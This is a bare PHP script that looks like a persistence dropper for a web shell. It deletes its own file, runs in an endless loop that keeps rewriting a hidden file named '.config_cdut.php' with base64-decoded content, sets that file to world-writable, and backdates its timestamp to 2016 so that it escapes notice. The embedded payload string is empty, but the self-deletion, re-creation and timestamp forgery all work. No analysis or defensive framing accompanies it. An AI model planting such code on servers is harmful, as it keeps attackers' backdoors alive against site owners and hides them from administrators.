<?php
error_reporting(0);
set_time_limit(0);
ignore_user_abort(1);
unlink(__FILE__);
$file = '.config_cdut.php';
$code = base64_decode('');
while (true) {
    if (md5(file_get_contents($file)) !== md5($code)) {
        file_put_contents($file, $code);
    }
    system('chmod 777 .config_cdut.php');
    touch(".config_cdut.php", mktime(20, 15, 1, 11, 28, 2016));
    usleep(100);
}
?>